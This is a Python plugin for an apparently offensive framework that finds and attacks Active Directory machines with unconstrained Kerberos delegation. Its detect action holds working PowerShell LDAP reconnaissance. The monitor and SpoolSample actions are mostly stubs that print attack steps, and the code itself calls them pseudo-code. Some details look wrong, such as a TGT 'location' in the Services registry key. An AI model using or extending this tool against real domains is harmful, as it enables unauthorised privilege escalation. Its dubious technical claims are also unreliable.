"""lateral_movement/unconstrained_delegation — Exploit unconstrained delegation for privilege escalation. MITRE T1187"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class UnconstrainedDelegation(BasePlugin):
    NAME = "unconstrained_delegation"
    DESCRIPTION = "Find and exploit machines with unconstrained Kerberos delegation enabled"
    AUTHOR = "fitnah-team"
    MITRE = "T1187"
    CATEGORY = "lateral_movement"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("action", str, required=False, default="detect",
              help="detect | monitor | spoolsample"),
        Param("computer", str, required=False, default="",
              help="Target computer name (for monitor/spoolsample)"),
        Param("target_dc", str, required=False, default="",
              help="DC to relay ticket to"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute unconstrained delegation attack"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action = params.get("action", "detect").lower()
        computer = params.get("computer", "")
        target_dc = params.get("target_dc", "")

        if action == "detect":
            return self._detect_unconstrained(ctx)
        elif action == "monitor":
            return self._monitor_delegation(ctx, computer)
        elif action == "spoolsample":
            return self._spoolsample_force(ctx, computer, target_dc)
        else:
            return ModuleResult.err(f"Unknown action: {action}")

    @staticmethod
    def _detect_unconstrained(ctx) -> ModuleResult:
        """Detect computers with unconstrained delegation"""
        ps_code = """
$results = @()
$results += '[*] Detecting machines with unconstrained delegation...'

try {
    # Get current domain
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name

    $results += "[*] Searching domain: $domain"

    # Create LDAP searcher for computers with TRUSTED_FOR_DELEGATION flag
    # UserAccountControl bit 524288 = TRUSTED_FOR_DELEGATION (0x80000)
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc")
    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)

    # Filter for computers with unconstrained delegation
    # userAccountControl:1.2.840.113556.1.4.803:=524288
    $ds.Filter = "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
    $ds.PageSize = 1000

    $computers = $ds.FindAll()
    $results += "[+] Found $($computers.Count) computers with unconstrained delegation"

    foreach ($comp in $computers) {
        $name = $comp.Properties['name'][0]
        $os = $comp.Properties['operatingSystem'][0]
        $results += "  [*] $name ($os)"
    }

    $results += "[*] These machines can capture TGTs from authenticating users"
    $results += "[*] Next: use monitor action to wait for admin authentication"

} catch {
    $results += "[!] Detection error: $_"
}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        if r["status"] != "ok":
            return ModuleResult.err(f"Detection failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="unconstrained_delegation_detect")

    @staticmethod
    def _monitor_delegation(ctx, computer: str) -> ModuleResult:
        """Monitor a machine with unconstrained delegation for TGT capture"""
        ps_code = f"""
$results = @()
$results += '[*] Monitoring for TGT on unconstrained delegation machine...'

$targetComputer = '{computer}'
if (-not $targetComputer) {{
    $results += '[-] Please specify target computer'
    $results -join "`n"
    exit
}}

try {{
    # Check if computer is accessible
    $results += "[*] Target: $targetComputer"

    # Monitor machine for authentication events
    # This would require access to:
    # 1. Remote Registry to read Kerberos tickets
    # 2. Event logs to detect authentication
    # 3. WMI to query processes

    # Simplified: Query for cached tickets
    $results += '[*] Attempting to connect to target machine...'

    # Get Kerberos tickets in LSASS on target machine
    # This requires local admin or SYSTEM on target
    $results += '[!] NOTE: Requires local admin privileges on target machine'
    $results += '[*] Use WMI/RPC to trigger auth, then extract TGT'
    $results += '[*] TGT location: registry HKEY_LOCAL_MACHINE/System/CurrentControlSet/Services'

}} catch {{
    $results += "[!] Monitor error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        if r["status"] != "ok":
            return ModuleResult.err(f"Monitor failed: {r['output']}")

        return ModuleResult.ok(data=r["output"])

    @staticmethod
    def _spoolsample_force(ctx, computer: str, target_dc: str) -> ModuleResult:
        """Use SpoolSample technique to force machine to authenticate"""
        ps_code = f"""
$results = @()
$results += '[*] SpoolSample attack - forcing authentication...'

$targetComputer = '{computer}'
$targetDC = '{target_dc}'

if (-not $targetComputer) {{
    $results += '[-] Specify target computer'
    $results -join "`n"
    exit
}}

try {{
    $results += "[*] Target computer: $targetComputer"
    $results += "[*] Target DC: $targetDC"

    # SpoolSample uses RPC to the Print Spooler service
    # Triggers: \\\\attacker\\share\\file.txt
    # This causes target machine to authenticate back

    $results += '[*] Building SpoolSample RPC request...'
    $results += '[*] Method: Use RPC to spoolss service (msrpc -u spoolss)'
    $results += '[*] Payload: Trigger print job that causes auth callback'

    # This is pseudo-code - real implementation requires:
    # 1. RPC client to connect to target
    # 2. Spoolss interface (uuid: 6bffd098-a112-3610-9833-46c3f87e345a)
    # 3. Call RpcOpenPrinter with network path
    # 4. Capture resulting TGT

    $results += '[!] SpoolSample requires advanced RPC/COM knowledge'
    $results += '[!] Consider using external tool: SpoolSample.exe'

}} catch {{
    $results += "[!] SpoolSample error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        if r["status"] != "ok":
            return ModuleResult.err(f"SpoolSample failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="spoolsample_tgt")
